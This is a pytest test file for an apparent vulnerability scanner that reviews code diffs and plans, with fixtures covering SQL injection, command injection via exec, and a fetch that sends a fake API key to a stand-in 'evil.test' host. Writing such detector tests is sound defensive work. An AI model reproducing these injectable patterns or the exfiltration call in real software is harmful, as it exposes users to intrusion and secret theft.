import pytest
import json
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker

from sqlalchemy import select

from sentinel_worker.models import Base, Edge, Finding, Node
from sentinel_worker.scan import parse_unified_diff, review_plan, scan_diff


@pytest.mark.asyncio
async def test_scan_diff_emits_sql_injection_finding():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
    async with sessionmaker() as session:
      async with session.begin():
        run = await scan_diff(session, "repo", "+++ b/app.js\n+app.get('/u', (req,res)=> db.query(`select * from users where id=${req.query.id}`))")
      async with session.begin():
        finding = await session.get(Finding, (await session.execute(Finding.__table__.select())).first()[0])
    assert run.status == "completed"
    assert finding.vuln_type == "sqli"


@pytest.mark.asyncio
async def test_scan_diff_populates_context_graph():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
    async with sessionmaker() as session:
      async with session.begin():
        await scan_diff(session, "repo", "+++ b/app.js\n+app.get('/u', (req,res)=> db.query(`select * from users where id=${req.query.id}`))")
      async with session.begin():
        route = await session.get(Node, "route:app.js:GET /u")
        flow = await session.scalar(select(Edge).where(Edge.kind == "FLOWS_TO"))
    assert route is not None
    assert route.is_entry_point is True
    assert flow is not None


def test_parse_unified_diff_collects_added_lines():
    files = parse_unified_diff("diff --git a/a b/a\n+++ b/a.py\n+print('x')\n unchanged")
    assert files[0].path == "a.py"
    assert "print" in files[0].content


@pytest.mark.asyncio
async def test_secret_severity_reflects_exfiltration_sink():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
    async with sessionmaker() as session:
      async with session.begin():
        await scan_diff(session, "repo", "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})")
      async with session.begin():
        finding = await session.scalar(select(Finding).where(Finding.vuln_type == "secret_leak"))
    assert finding is not None
    assert finding.severity == "critical"


@pytest.mark.asyncio
async def test_scan_trace_reports_blast_radius_and_adapter_coverage():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
    async with sessionmaker() as session:
      async with session.begin():
        run = await scan_diff(session, "repo", "+++ b/app.js\n+app.get('/u', (req,res)=> res.json({ok:true}))")
    events = [json.loads(line) for line in run.trace.splitlines()]
    graph_update = next(event for event in events if event["kind"] == "graph_update.completed")
    coverage = next(event for event in events if event["kind"] == "adapter.coverage")
    assert graph_update["changed_files"] == 1
    assert graph_update["blast_radius_files"] == 1
    assert coverage["matched_files"] == ["app.js"]
    assert coverage["unmatched_files"] == []


@pytest.mark.asyncio
async def test_review_plan_with_retry_runs_until_issue_set_stabilizes():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
    async with sessionmaker() as session:
      async with session.begin():
        run, findings = await review_plan(session, "repo", "Add endpoint that runs exec(`convert ${req.query.file}`)", with_retry=True)

    events = [json.loads(line) for line in run.trace.splitlines()]
    passes = [event for event in events if event["kind"] == "plan.pass.completed"]
    completed = next(event for event in events if event["kind"] == "plan.completed")

    assert len(passes) == 2
    assert passes[0]["new_issue_count"] == 1
    assert passes[1]["new_issue_count"] == 0
    assert any(event["kind"] == "plan.retry.stabilized" for event in events)
    assert completed["retry_passes"] == 2
    assert [finding.vuln_type for finding in findings] == ["cmdi"]


@pytest.mark.asyncio
async def test_review_plan_without_retry_runs_single_pass():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
    async with sessionmaker() as session:
      async with session.begin():
        run, _ = await review_plan(session, "repo", "Add query db.query(`select ${req.query.id}`)", with_retry=False)

    events = [json.loads(line) for line in run.trace.splitlines()]
    passes = [event for event in events if event["kind"] == "plan.pass.completed"]

    assert len(passes) == 1
    assert passes[0]["vuln_types"] == ["sqli"]
